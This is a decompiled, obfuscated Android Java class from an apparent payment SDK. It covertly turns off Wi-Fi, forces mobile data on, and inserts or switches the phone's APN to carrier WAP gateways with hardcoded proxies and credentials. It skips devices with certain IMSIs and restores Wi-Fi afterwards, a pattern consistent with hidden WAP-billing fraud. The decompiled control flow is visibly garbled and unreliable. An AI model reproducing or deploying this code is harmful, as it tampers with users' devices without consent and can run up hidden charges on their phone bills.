package com.android.sdk.pay;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.SQLException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build.VERSION;
import android.util.Log;

public class g
{
  public static boolean a;
  private static final String b = g.class.getSimpleName();
  private static boolean c;
  private static boolean d;
  private static String e;
  
  public g() {}
  
  public static void a(Context paramContext)
  {
    a(paramContext, 2);
  }
  
  public static void a(Context paramContext, int paramInt)
  {
    ActivityTool.b(b, "checkOpenGprs connType=" + paramInt);
    f(paramContext);
    String str = h.b(paramContext).d();
    ActivityTool.b(b, "checkOpenGprs apn_is_wap=" + a + ";imsi=" + ActivityTool.a(str));
    if ((b(paramContext) >= 0) && (paramInt == 1)) {}
    while ((str == null) || (str.substring(0, 5).equals("31026")) || (!h.b(paramContext).a()) || (!e(paramContext))) {
      return;
    }
    if (Build.VERSION.SDK_INT < 14)
    {
      boolean bool = h(paramContext);
      a("checkOpenGprs: " + bool);
      if (bool)
      {
        a = true;
        return;
      }
      f(paramContext);
      return;
    }
    g(paramContext);
    f(paramContext);
  }
  
  static void a(String paramString)
  {
    ActivityTool.b(b, paramString);
  }
  
  public static boolean a()
  {
    return (l.a().b()) && (ab.a().b()) && (e.a() == 0);
  }
  
  public static int b(Context paramContext)
  {
    Object localObject = (ConnectivityManager)paramContext.getSystemService("connectivity");
    try
    {
      localObject = ((ConnectivityManager)localObject).getActiveNetworkInfo();
      if ((localObject == null) || (!((NetworkInfo)localObject).isAvailable()))
      {
        a("getInternetState false");
        return -1;
      }
      int i = ((NetworkInfo)localObject).getType();
      if ((i == 1) && (((NetworkInfo)localObject).isConnected()))
      {
        a("getInternetState cur is wifi");
        return 0;
      }
      if (i == 0)
      {
        if (j(paramContext))
        {
          a("getInternetState cur is wap");
          return 1;
        }
        a("getInternetState cur is net");
        return 2;
      }
      return 0;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return -1;
  }
  
  private static boolean b(Context paramContext, int paramInt)
  {
    Uri localUri = Uri.parse("content://telephony/carriers/preferapn");
    paramContext = paramContext.getContentResolver();
    Object localObject = new ContentValues();
    ((ContentValues)localObject).put("apn_id", Integer.valueOf(paramInt));
    try
    {
      paramContext.update(localUri, (ContentValues)localObject, null, null);
      localObject = "_id=" + paramInt;
      paramContext = paramContext.query(localUri, new String[] { "name", "apn" }, (String)localObject, null, null);
      if (paramContext != null)
      {
        paramContext.close();
        return true;
      }
    }
    catch (SQLException paramContext)
    {
      paramContext.printStackTrace();
    }
    return false;
  }
  
  public static void c(Context paramContext)
  {
    int k = 0;
    for (;;)
    {
      WifiManager localWifiManager;
      int i;
      try
      {
        bool = a();
        if (!bool) {
          return;
        }
        ActivityTool.b(b, "recoverAppData wifiState wifi_is_opened=" + c);
        if (!h.b(paramContext).a()) {
          continue;
        }
        if (d)
        {
          d = false;
          d(paramContext);
        }
        if (!c) {
          continue;
        }
        localWifiManager = (WifiManager)paramContext.getSystemService("wifi");
        i = localWifiManager.getWifiState();
        localWifiManager.setWifiEnabled(true);
        c = false;
        j = i;
      }
      finally {}
      try
      {
        Thread.sleep(3000L);
        j = i;
        i = localWifiManager.getWifiState();
        j = i;
        ActivityTool.b(b, "recoverAppData wifiState first open check wifiState=" + i + ";times=" + k);
        if (i != 3) {
          break label218;
        }
        j = i;
      }
      catch (InterruptedException localInterruptedException)
      {
        localInterruptedException.printStackTrace();
        continue;
      }
      boolean bool = m(paramContext);
      ActivityTool.b(b, "recoverAppData wifiState=" + j + ";isWifiOK=" + bool + ";wifi_is_opened=" + c);
      continue;
      label218:
      int j = i;
      if (k < 3) {
        k += 1;
      }
    }
  }
  
  private static void d(Context paramContext)
  {
    paramContext = (ConnectivityManager)paramContext.getSystemService("connectivity");
    if (Build.VERSION.SDK_INT > 8)
    {
      f.a();
      f.a(paramContext, false);
    }
  }
  
  private static boolean e(Context paramContext)
  {
    paramContext = (ConnectivityManager)paramContext.getSystemService("connectivity");
    if (Build.VERSION.SDK_INT > 8)
    {
      f.a();
      boolean bool = f.a(paramContext);
      ActivityTool.b(b, "enableGprs isDataEnabled=" + bool);
      if (!bool)
      {
        if (f.a(paramContext, true))
        {
          d = true;
          ActivityTool.a(3500L);
        }
      }
      else {
        return true;
      }
      return false;
    }
    return false;
  }
  
  private static void f(Context paramContext)
  {
    a("checkApnIsWap");
    if (b(paramContext) == 1)
    {
      a = true;
      return;
    }
    a = false;
  }
  
  private static void g(Context paramContext)
  {
    paramContext = (WifiManager)paramContext.getSystemService("wifi");
    try
    {
      i = paramContext.getWifiState();
      ActivityTool.b(b, "checkApn2Wap (wifi 2/3)wifiState=" + i);
      if ((i == 2) || (i == 3))
      {
        c = true;
        paramContext.setWifiEnabled(false);
        ActivityTool.a(10000L);
      }
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        int i = 4;
      }
    }
  }
  
  private static boolean h(Context paramContext)
  {
    g(paramContext);
    if (i(paramContext)) {
      return true;
    }
    boolean bool;
    int i;
    if ((k(paramContext)) || (l(paramContext)))
    {
      bool = b(paramContext, Integer.parseInt(e));
      ActivityTool.b(b, "setUsWapApn:" + bool);
      i = 0;
    }
    for (;;)
    {
      if (i >= 15) {
        return false;
      }
      ActivityTool.a(2000L);
      if (b(paramContext) == 1) {
        break;
      }
      if ((i == 5) && (!i(paramContext)))
      {
        b(paramContext, Integer.parseInt(e));
        ActivityTool.b(b, "setUsWapApn:" + bool);
      }
      i += 1;
    }
  }
  
  private static boolean i(Context paramContext)
  {
    for (;;)
    {
      try
      {
        localObject = Uri.parse("content://telephony/carriers/preferapn");
        paramContext = paramContext.getContentResolver().query((Uri)localObject, null, null, null, null);
        if ((paramContext != null) && (paramContext.moveToFirst()))
        {
          localObject = paramContext.getString(paramContext.getColumnIndex("name"));
          str1 = paramContext.getString(paramContext.getColumnIndex("apn"));
          str2 = paramContext.getString(paramContext.getColumnIndex("proxy"));
          str3 = paramContext.getString(paramContext.getColumnIndex("port"));
          str4 = paramContext.getString(paramContext.getColumnIndex("current"));
          if ((localObject == null) || (str1 == null) || (str2 == null) || (str3 == null) || (str4 == null)) {
            bool = false;
          }
        }
      }
      catch (Exception paramContext)
      {
        Object localObject;
        String str1;
        String str2;
        String str3;
        String str4;
        bool = false;
      }
      try
      {
        paramContext.close();
        return bool;
      }
      catch (Exception paramContext)
      {
        for (;;) {}
      }
      if (((str2.equals("10.0.0.200")) || (str2.equals("010.000.000.200")) || (str2.equals("10.0.0.172")) || (str2.equals("010.000.000.172"))) && (str3.equals("80")) && (str4.equals("1"))) {
        if (!((String)localObject).toLowerCase().contains("wap"))
        {
          bool = str1.toLowerCase().contains("wap");
          if (!bool) {}
        }
        else
        {
          bool = true;
          continue;
          Log.e("con", paramContext.getMessage());
          return bool;
        }
      }
      boolean bool = false;
    }
  }
  
  private static boolean j(Context paramContext)
  {
    for (;;)
    {
      boolean bool;
      try
      {
        localObject = Uri.parse("content://telephony/carriers/preferapn");
        paramContext = paramContext.getContentResolver().query((Uri)localObject, null, null, null, null);
        if ((paramContext != null) && (paramContext.moveToFirst()))
        {
          localObject = paramContext.getString(paramContext.getColumnIndex("proxy"));
          str1 = paramContext.getString(paramContext.getColumnIndex("port"));
          str2 = paramContext.getString(paramContext.getColumnIndex("current"));
          if ((localObject == null) || (str1 == null) || (str2 == null)) {
            bool = false;
          }
        }
      }
      catch (Exception paramContext)
      {
        Object localObject;
        String str1;
        String str2;
        bool = false;
      }
      try
      {
        paramContext.close();
        return bool;
      }
      catch (Exception paramContext)
      {
        for (;;) {}
      }
      if (((((String)localObject).equals("10.0.0.200")) || (((String)localObject).equals("010.000.000.200"))) && (str1.equals("80")) && (str2.equals("1")))
      {
        bool = true;
      }
      else
      {
        if (((((String)localObject).equals("10.0.0.172")) || (((String)localObject).equals("010.000.000.172"))) && (str1.equals("80")))
        {
          bool = str2.equals("1");
          if (bool)
          {
            bool = true;
            continue;
            Log.e("con", paramContext.getMessage());
            return bool;
          }
        }
        bool = false;
      }
    }
  }
  
  private static boolean k(Context paramContext)
  {
    boolean bool;
    for (;;)
    {
      try
      {
        localObject = Uri.parse("content://telephony/carriers");
        localObject = paramContext.getContentResolver().query((Uri)localObject, null, " current=1", null, null);
        if (localObject != null)
        {
          bool = ((Cursor)localObject).moveToNext();
          if (bool) {}
        }
        else
        {
          bool = false;
        }
      }
      catch (Exception paramContext)
      {
        Object localObject;
        String str1;
        String str2;
        String str3;
        String str4;
        String str5;
        String str6;
        bool = false;
      }
      try
      {
        ((Cursor)localObject).close();
        return bool;
      }
      catch (Exception paramContext)
      {
        for (;;) {}
      }
      str1 = ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("_id"));
      str2 = ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("name"));
      str3 = ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("apn"));
      str4 = ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("port"));
      str5 = ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("proxy"));
      str6 = ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("current"));
      if ((str2 != null) && (str3 != null) && (str5 != null) && (str4 != null) && (str6 != null)) {
        if (h.b(paramContext).b())
        {
          if (((str5.equals("10.0.0.200")) || (str5.equals("010.000.000.200"))) && (str4.equals("80")) && (str6.equals("1")) && ((str2.toLowerCase().contains("wap")) || (str3.toLowerCase().contains("ctwap"))))
          {
            e = str1;
            bool = true;
          }
        }
        else if (h.b(paramContext).c())
        {
          if (((str5.equals("10.0.0.172")) || (str5.equals("10.0.0.172"))) && (str4.equals("80")) && (str6.equals("1")) && ((str2.toLowerCase().contains("wap")) || (str3.toLowerCase().contains("wap"))))
          {
            e = str1;
            bool = true;
          }
        }
        else if (((str5.equals("10.0.0.172")) || (str5.equals("010.000.000.172"))) && (str4.equals("80")) && (str6.equals("1")) && ((str2.toLowerCase().contains("wap")) || (str3.toLowerCase().contains("cmwap"))))
        {
          e = str1;
          bool = true;
        }
      }
    }
    Log.e("con", paramContext.getMessage());
    return bool;
  }
  
  private static boolean l(Context paramContext)
  {
    Uri localUri = Uri.parse("content://telephony/carriers");
    String str = h.b(paramContext).d().substring(0, 5);
    ContentValues localContentValues = new ContentValues();
    localContentValues.put("port", "80");
    localContentValues.put("current", Integer.valueOf(1));
    localContentValues.put("numeric", str);
    localContentValues.put("mcc", "460");
    localContentValues.put("mnc", str.substring(3, 5));
    localContentValues.put("type", "default");
    if (h.b(paramContext).b())
    {
      localContentValues.put("name", "中国电信CTWAP");
      localContentValues.put("apn", "#777");
      localContentValues.put("proxy", "10.0.0.200");
      localContentValues.put("user", "ctwap@mycdma.cn");
      localContentValues.put("password", "vnet.mobi");
    }
    for (;;)
    {
      try
      {
        paramContext = paramContext.getContentResolver();
        localUri = paramContext.insert(localUri, localContentValues);
        if (localUri == null) {
          break;
        }
        a("addUsWapApn");
        paramContext = paramContext.query(localUri, null, null, null, null);
        paramContext.moveToFirst();
        e = paramContext.getString(paramContext.getColumnIndex("_id"));
        if (paramContext == null) {
          break;
        }
        paramContext.close();
        return true;
      }
      catch (SQLException paramContext)
      {
        paramContext.printStackTrace();
      }
      if (h.b(paramContext).c())
      {
        localContentValues.put("name", "中国联通UNIWAP");
        localContentValues.put("apn", "uniwap");
        localContentValues.put("proxy", "10.0.0.172");
      }
      else
      {
        localContentValues.put("name", "中国移动CMWAP");
        localContentValues.put("apn", "cmwap");
        localContentValues.put("proxy", "10.0.0.172");
      }
    }
    return false;
  }
  
  private static boolean m(Context paramContext)
  {
    paramContext = (ConnectivityManager)paramContext.getSystemService("connectivity");
    try
    {
      paramContext = paramContext.getActiveNetworkInfo();
      if ((paramContext == null) || (!paramContext.isAvailable()))
      {
        a("getInternetState false");
        return false;
      }
      if ((paramContext.getType() == 1) && ((paramContext.isConnected()) || (paramContext.isConnectedOrConnecting())))
      {
        a("getInternetState cur is wifi");
        return true;
      }
    }
    catch (Exception paramContext)
    {
      a(paramContext.getMessage());
    }
    return false;
  }
}
